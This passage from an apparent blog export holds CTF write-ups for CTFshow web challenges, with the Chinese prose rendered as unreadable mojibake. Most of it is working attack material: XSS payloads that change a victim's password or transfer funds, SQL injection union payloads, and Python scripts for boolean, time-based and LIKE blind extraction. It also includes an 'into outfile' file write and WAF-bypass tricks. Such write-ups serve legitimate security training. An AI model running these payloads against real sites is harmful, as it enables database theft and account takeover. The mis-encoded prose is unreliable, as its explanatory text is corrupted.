id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>ä¿®æ”¹å¯†ç åŠŸèƒ½ä¸ºpostä¼ å‚ä¿®æ”¹</p><p><code>&lt;script&gt;$.post(&quot;http://api/change.php&quot;,{p:123123},&quot;json&quot;);&lt;/script&gt;</code></p><h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>å…¶ä¸€å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œéœ€è¦ä½ çš„å¯†ç ä¸€å®šè¦å¤§äº6ä½æ•°ï¼Œä¸ç„¶è½¬è´¦æ˜¯ä¸ä¼šæˆåŠŸçš„ï¼Œåˆ©ç”¨è´Ÿè´Ÿå¾—æ­£çš„åŸç†ï¼Œè¿™æ ·è½¬è´¦-99999å†è½¬è´¦-999999999å°±æ˜¯æ­£æ•´æ•°äº†</p><h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>åˆ©ç”¨adminè´¦æˆ·ç»™è‡ªå·±è½¬è´¦ï¼š</p><p><code>&lt;script&gt;$.post(&quot;http://127.0.0.1/api/amount.php&quot;,{&#39;u&#39;:&#39;ad&#39; ,&#39;a&#39;:10000},&quot;json&quot;);&lt;/script&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹web(å››)</title>
      <link href="/2021/07/24/ctfshow-zhi-sql-zhu-ru/"/>
      <url>/2021/07/24/ctfshow-zhi-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»Šå¤©æ˜¯2021/7/25ï¼Œæ­£å¼è¿›å…¥sqlæ³¨å…¥ä¸“é¢˜ï¼Œç›®æ ‡ï¼šåŠ å¼ºpythonçš„å­¦ä¹ ï¼Œè¾¾åˆ°é€šè¿‡å†™pythonè„šæœ¬ï¼ŒåŠ å¿«æ³¨å…¥é€Ÿåº¦çš„ç¨‹åº¦ï¼ŒæŒæ¡sqlåœ¨phpç¼–ç¨‹ä¸­çš„ä¸€ç³»åˆ—æŸ¥è¯¢è¯­å¥ã€‚</p><h1 id="æ–°æ‰‹åŒº"><a href="#æ–°æ‰‹åŒº" class="headerlink" title="æ–°æ‰‹åŒº"></a>æ–°æ‰‹åŒº</h1><p>å¯ä»¥çœ‹çœ‹Y4å¸ˆå‚…ä»¥å‰è®°å½•çš„å°ç¬”è®°<br><a href="https://blog.csdn.net/solitudi/article/details/106820588?ops_request_misc=%7B%22request%5Fid%22%3A%22160630921119725271050515%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160630921119725271050515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-4-106820588.pc_v2_rank_blog_default&utm_term=æ³¨å…¥&spm=1018.2118.3001.4450" target="_blank" rel="noopener">SQLæ³¨å…¥ä¹‹MySQLæ³¨å…¥çš„å­¦ä¹ ç¬”è®°(ä¸€)</a><br><a href="https://blog.csdn.net/solitudi/article/details/106824456?ops_request_misc=%7B%22request%5Fid%22%3A%22160630921119725271050515%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=160630921119725271050515&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-2-106824456.pc_v2_rank_blog_default&utm_term=æ³¨å…¥&spm=1018.2118.3001.4450" target="_blank" rel="noopener">SQLæ³¨å…¥ä¹‹MySQLæ³¨å…¥å­¦ä¹ ç¬”è®°(äºŒ)</a></p><h1 id="2021-7-25"><a href="#2021-7-25" class="headerlink" title="2021-7-25"></a>2021-7-25</h1><h1 id="web172ã€web173â€”â€”hex-ã€to-base64"><a href="#web172ã€web173â€”â€”hex-ã€to-base64" class="headerlink" title="web172ã€web173â€”â€”hex() ã€to_base64()"></a>web172ã€web173â€”â€”<code>hex() ã€to_base64()</code></h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from ctfshow_user2 where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">!==</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ„æ€å¤§æ¦‚å°±æ˜¯æŠŠflagä»æŸ¥è¯¢ä¸­ç»™banæ‰äº†</p><p><strong>è§£å†³æ–¹æ³•</strong></p><p>åˆ©ç”¨ç¼–ç è§£å†³ï¼šbase64ã€hex</p><p>è¿™é‡Œé’ˆå¯¹çš„æ˜¯<code>id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>ï¼ŒåŒå¼•å·æ˜¯åŒ…æ‹¬åœ¨å†…çš„ï¼Œå¯èƒ½åªæ˜¯èµ·è§£æä½œç”¨</p><p><strong>payload</strong></p><p><code>yn8&#39;union select to_base64(username),hex(password) from ctfshow_user2+--+</code></p><p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16è¿›åˆ¶åœ¨çº¿</a></p><h1 id="web174â€”â€”ç›²æ³¨"><a href="#web174â€”â€”ç›²æ³¨" class="headerlink" title="web174â€”â€”ç›²æ³¨"></a>web174â€”â€”ç›²æ³¨</h1><p><strong>æŸ¥è¯¢è¯­å¥ä¸€æ ·(ä¸è´´äº†ï¼Œå åœ°æ–¹)</strong></p><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/php-json.html" target="_blank" rel="noopener">PHP JSON</a></p><p>ä¹Ÿå°±æ˜¯è¯´è¿”å›çš„ç»“æœæ˜¯ä¸èƒ½æœ‰flagå’Œä»»ä½•æ•°å­—</p><p><strong>è§£å†³æ–¹æ¡ˆ</strong></p><p>é‡‡å–ç›²æ³¨å¹¶åˆ©ç”¨äºŒåˆ†æ³•æ¥åˆ¤æ–­</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/25 17:17</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://cece2e87-a82b-4be3-9a5d-fd78f587916e.challenge.ctf.show:8080/api/v4.php"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># åˆ›å»ºä¸€ä¸ªæ•´æ•°åˆ—è¡¨</span>    max <span class="token operator">=</span> <span class="token number">128</span>  <span class="token comment" spellcheck="true"># ASCIIå¯è§å­—ç¬¦</span>    min <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> min<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>max<span class="token operator">-</span>min<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># å–æ•´é™¤ - å‘ä¸‹å–æ¥è¿‘å•†çš„æ•´æ•°</span>        <span class="token keyword">if</span> min<span class="token operator">==</span>mid<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        payload<span class="token operator">=</span><span class="token string">"?id=' union select 'a',"</span> \                <span class="token string">"if(ascii(substr((select group_concat(password) "</span> \                <span class="token string">"from ctfshow_user4 where username='flag'),%d,1))&lt;%d,"</span> \                <span class="token string">"'small','da')+--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment" spellcheck="true">#print(res)</span>        <span class="token keyword">if</span> <span class="token string">"small"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>            max <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            min <span class="token operator">=</span> mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-7-26"><a href="#2021-7-26" class="headerlink" title="2021-7-26"></a>2021-7-26</h1><h1 id="web175â€”â€”æ—¶é—´ç›²æ³¨"><a href="#web175â€”â€”æ—¶é—´ç›²æ³¨" class="headerlink" title="web175â€”â€”æ—¶é—´ç›²æ³¨"></a>web175â€”â€”æ—¶é—´ç›²æ³¨</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ£€æµ‹\x00-\x7fä¹Ÿå°±æ˜¯0-127ï¼Œæ‰€ä»¥æ™®é€šçš„ç›²æ³¨æ˜¯ä¸è¡Œäº†</p><p>æ—¶é—´ç›²æ³¨æµ‹è¯•è¯­å¥ï¼š<code>1&#39;and if(1=1,sleep(2),0)+--+</code>å¯ä»¥</p><p><a href="https://zhuanlan.zhihu.com/p/46815128" target="_blank" rel="noopener">Python 3 å­—ç¬¦ä¸²å‰ åŠ  uã€rã€b ã€fçš„å«ä¹‰</a></p><p><a href="https://www.cnblogs.com/Neeo/articles/10536202.html" target="_blank" rel="noopener">ä¸€ç¯‡è¯»æ‡‚Pythonä¸­çš„ä½è¿ç®—</a></p><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>å«æ¥y4çš„è„šæœ¬ï¼Œæ¯”è¾ƒå¥½ç†è§£</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://6cd84f2d-be07-46cc-bc8e-90b6ff57f72a.challenge.ctf.show:8080/api/v5.php?id=1' and "</span>result <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr(database(),{i},1))>{mid},sleep(2),0)+--+'</span>        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr((select table_name from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(2),0)+--+'</span>        <span class="token comment" spellcheck="true"># payload = f'1=if(ascii(substr((select column_name from information_schema.columns where table_name='ctfshow_user5'),{i},1))>{mid},sleep(2),0)+--+'</span>        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0)+--+'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>åˆ©ç”¨into outfileæ¥å®ç°æ–‡ä»¶çš„è¾“å‡º</p><pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' union select 1,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/1.txt'+--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="web176â€”â€”å¤§å°å†™ç»•è¿‡"><a href="#web176â€”â€”å¤§å°å†™ç»•è¿‡" class="headerlink" title="web176â€”â€”å¤§å°å†™ç»•è¿‡"></a>web176â€”â€”å¤§å°å†™ç»•è¿‡</h1><h1 id="web177-179â€”â€”ç©ºæ ¼ç»•è¿‡"><a href="#web177-179â€”â€”ç©ºæ ¼ç»•è¿‡" class="headerlink" title="web177-179â€”â€”ç©ºæ ¼ç»•è¿‡"></a>web177-179â€”â€”ç©ºæ ¼ç»•è¿‡</h1><p>é™¤äº†ç©ºæ ¼ï¼Œåœ¨ä»£ç ä¸­å¯ä»¥ä»£æ›¿çš„ç©ºç™½ç¬¦è¿˜æœ‰ï¼š</p><pre><code>%0a%0b%0c%0d%09%a0(åœ¨ç‰¹å®šå­—ç¬¦é›†æ‰èƒ½åˆ©ç”¨)ä»¥ä¸Šå‡ä¸ºURLç¼–ç /**/ç»„åˆæ‹¬å·%23ä»£æ›¿æ³¨é‡Šç¬¦ -- </code></pre><h1 id="web180-182â€”â€”ä¼˜å…ˆçº§-and-gt-or"><a href="#web180-182â€”â€”ä¼˜å…ˆçº§-and-gt-or" class="headerlink" title="web180-182â€”â€”ä¼˜å…ˆçº§ and &gt; or"></a>web180-182â€”â€”<code>ä¼˜å…ˆçº§ and &gt; or</code></h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç©ºæ ¼åˆ©ç”¨çš„æ˜¯()æ‹¬å·ä»£æ›¿çš„</p><p><strong>è§£é¢˜ï¼š</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">where username !='flag' and id = ''or(id=26)and'1'='1' limit 1where (username !='flag' and id = '')or(id=26 and'1'='1') limit 1å› ä¸ºorçš„å­˜åœ¨ï¼Œç›¸å½“äºè¦selectä¸¤æ¬¡ï¼Œä½†åˆå› ä¸ºorå·¦è¾¹æ˜¯ä¸º0çš„ï¼Œå³è¾¹ä¸ºid=26ï¼Œæ‰€ä»¥åªselectå³è¾¹å®Œæ•´çš„sqlè¯­å¥å˜ä¸ºï¼šselect id,username,password from ctfshow_user where id=26 limit 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å…³äºä¼˜å…ˆçº§é—®é¢˜å°±è·ŸåŠ å‡å·ä¸ä¹˜é™¤å·ä¸€æ ·ï¼Œandå…ˆè¿ç®—ï¼Œé‚£ä¹ˆandçš„è¿ç®—ç»“æœè¿‡ç¨‹å¦‚ä½•è§£é‡Šï¼šéœ€è¦åŒæ—¶æ»¡è¶³ä¸¤è¾¹çš„æ¡ä»¶æ‰ä¼šè¿”å›trueï¼Œå¦åˆ™ä¸æ‰§è¡Œå•Šï¼é‚£ä¹ˆè¿™é‡Œå°±æ˜¯è®©ç¬¬ä¸€ä¸ªandè¯­å¥è¿”å›falseè®©åé¢çš„andè¯­å¥æ¥åšåˆ°çŸ¥è¡Œçš„æ•ˆæœ</p><p><strong>payloadï¼š</strong><code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p><h1 id="web183â€”â€”likeç›²æ³¨"><a href="#web183â€”â€”likeç›²æ³¨" class="headerlink" title="web183â€”â€”likeç›²æ³¨"></a>web183â€”â€”likeç›²æ³¨</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select count(pass) from "</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'tableName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æŸ¥è¯¢ç»“æœ</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è§£é¢˜æ€è·¯</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">æ‹¬å·ä»£æ›¿çš„æ˜¯ç©ºæ ¼tableName=(ctfshow_user)where(pass)like'ctfshow{%'% ï¼šåœ¨sqlä¸­é€šé… N ä¸ªå­—ç¬¦_ ï¼šé€šé…ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¼šå‘ç°è¿”å›ç»“æœ  $user_count = 1;ä»£è¡¨åŒ¹é…åˆ°äº†ä¸€ä¸ªï¼Œåˆ©ç”¨æ­¤æ¨¡å¼ç›²æ³¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>pythonè„šæœ¬</strong></p><p>éœ€è¦postä¼ å‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/27 12:21</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sysurl <span class="token operator">=</span> <span class="token string">'http://d4c4cba3-a83d-4957-a3e7-b6d67bd3a89d.challenge.ctf.show:8080/select-waf.php'</span>letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-{}'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"(ctfshow_user)where(pass)like'{}%'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token string">"}"</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-7-27"><a href="#2021-7-27" class="headerlink" title="2021-7-27"></a>2021-7-27</h1><h1 id="web184â€”â€”åˆ©ç”¨havingä»£æ›¿whereè¿›è¡Œlikeç›²æ³¨"><a href="#web184â€”â€”åˆ©ç”¨havingä»£æ›¿whereè¿›è¡Œlikeç›²æ³¨" class="headerlink" title="web184â€”â€”åˆ©ç”¨havingä»£æ›¿whereè¿›è¡Œlikeç›²æ³¨"></a>web184â€”â€”åˆ©ç”¨<a href="https://www.runoob.com/sqlite/sqlite-having-clause.html" target="_blank" rel="noopener">having</a>ä»£æ›¿whereè¿›è¡Œlikeç›²æ³¨</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>pythonè„šæœ¬</strong></p><p>åˆ©ç”¨åˆ°äº†<a href="https://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">mysqlä¸­çš„regexpæ­£åˆ™åŒ¹é…</a></p><p><a href="https://www.cnblogs.com/zeroingToOne/p/9575203.html" target="_blank" rel="noopener">MySQLä¸­çš„å†…è¿æ¥ã€å·¦è¿æ¥ã€å³è¿æ¥ã€å…¨è¿æ¥ã€äº¤å‰è¿æ¥</a></p><p><a href="https://www.runoob.com/w3cnote/sql-join-the-different-of-on-and-where.html" target="_blank" rel="noopener">SQL JOIN ä¸­ on ä¸ where çš„åŒºåˆ«</a>ï¼šåœ¨æ­¤è„šæœ¬ä¸­æ˜¯ç”¨onä»£æ›¿äº†where</p><p>åˆ©ç”¨havingæ¥ä»£æ›¿whereä¹Ÿæ˜¯ä½œä¸ºä¸€ä¸ªæ¡ä»¶åˆ¤æ–­å­å¥</p><p>åˆ©ç”¨16è¿›åˆ¶ä»£æ›¿å¼•å·</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span><span class="token shell-comment comment"># @Author  : Yn8rt</span><span class="token shell-comment comment"># @Time    : 2021/7/27 15:04</span><span class="token shell-comment comment"># @Function:</span>import requestsimport sysurl <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//683f40c0-31e4-46a7-bed1-f8eb216b7515.challenge.ctf.show:8080/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>letter <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-{}"</span>def <span class="token function">asc2hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    a1 <span class="token operator">=</span> <span class="token string">''</span>    a2 <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i in s<span class="token punctuation">:</span>        a1<span class="token operator">+</span><span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    a2 <span class="token operator">=</span> a1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a2<span class="token keyword">for</span> i in <span 